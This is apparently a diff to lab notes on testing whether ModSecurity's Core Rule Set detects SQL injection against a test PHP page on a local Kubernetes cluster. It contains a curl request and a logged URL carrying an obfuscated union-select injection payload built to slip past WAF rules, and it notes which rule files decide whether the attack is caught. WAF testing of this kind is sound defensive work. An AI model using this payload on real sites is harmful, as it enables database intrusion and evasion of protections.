@@ -60,7 +60,7 @@ kubectl get nodes -o wide       172.18.0.2
 kubectl get service             31500
 curl http://172.18.0.2:31500/
 curl http://172.18.0.2:31500/test/artists.php
-curl http://172.18.0.2:31830/test/artists.php?artist=0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
+curl http://172.18.0.2:32045/test/artists.php?artist=0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
 
 06. cleanup
 30656
@@ -77,3 +77,8 @@ the 2x files that will cause the SQL injection to be detected by ModSec are:
 if the 2x files are the following then SQL injection will not be detected by ModSec
 - crs-setup.conf
 - REQUEST-942-APPLICATION-ATTACK-SQLI.conf
+
+
+
+
+req.URL : "/test/artists.php?artist=0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user"
